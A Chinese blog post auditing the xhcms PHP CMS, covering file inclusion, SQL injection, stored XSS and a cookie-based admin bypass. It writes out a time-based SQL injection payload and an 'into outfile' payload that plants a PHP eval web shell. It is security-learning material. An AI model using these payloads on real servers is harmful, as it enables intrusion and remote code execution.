---
title: xhcms审计
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-11-02 14:38:31
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1186561.jpg
---
一个只要扫一眼就能看出洞的cms。
# 环境搭建

php版本不能过高，经测试5.6.9可以，7.4.3不行。
访问http://www.xhcms.com:1236/install进行配置（需要手动创建数据库）

# 代码审计

seay扫一遍

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103143616.png)

## 文件包含

### /index.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103145607.png)

虽然加了addslashes，但是只能处理单双引号并不影响文件包含。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103150738.png)

### /admin/index.php

同上

## SQL注入

### 误报 /admin/files/adset.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103210540.png)

seay报的是update那里，但是这上面加了addslashes，所以这里不存在sq注入。

注：并不是加了addslashes就一定无解了。如果后台语句中本来就没有引号，那么加addslashes也是没用的，因为它的本意就是去处理单双引号等。还有一种情况是宽字节注入。见：https://www.freebuf.com/vuls/271416.html

### /admin/editcolumn.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103214709.png)

无过滤
payload

	?r=editcolumn&id=1%27and%20sleep(3)--+&type=1

后面的update注入点也是在id

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103221155.png)

### /admin/editlink.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103221450.png)

同3

### /admin/editsoft.php

同3。

看到有上传点，跟一下看看能不能getshell

白名单后缀

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103224051.png)

并且不返回路径，以及更改文件名

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103224144.png)

这里是没戏了。

### /admin/editwz.php

同3

### /admin/imageset.php

无过滤

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103234000.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211103233925.png)

注意mysql_query只能执行一条语句，所以往后面拼接（堆叠注入）是不行的。

### /admin/manageinfo.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104125656.png)

update同上。

### /admin/newlink.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104132214.png)

报错注入+1

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104132437.png)

### /admin/reply.php

和上面几个差不多
sql感觉问题都一样，相似的就不继续看=写了。

## XSS

### /admin/manageinfo.php

个人资料的修改
上传没有限制，并且每次访问会读取数据库中数据并显示

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104131354.png)

存储型：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104131611.png)

不过这个没什么利用价值。

### /file/contact.php

这里留言是存在存储型xss的，因为昵称邮箱网址没过滤。

## 越权

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104134049.png)

只要cookie传入admin就可以登入admin。

## getshell

由于这个cms对上传有处理，所以无法通过上传直接getshell。但是可以通过sql注入写入，前提是secure_file_priv为空。


	?r=reply&type=1&id=1'and select '<?php @eval($_POST[1]) ?>' into outfile '/var/www/html/shell.php';

## 总结

看的困死了，还有很多不想看了，这个太简单了。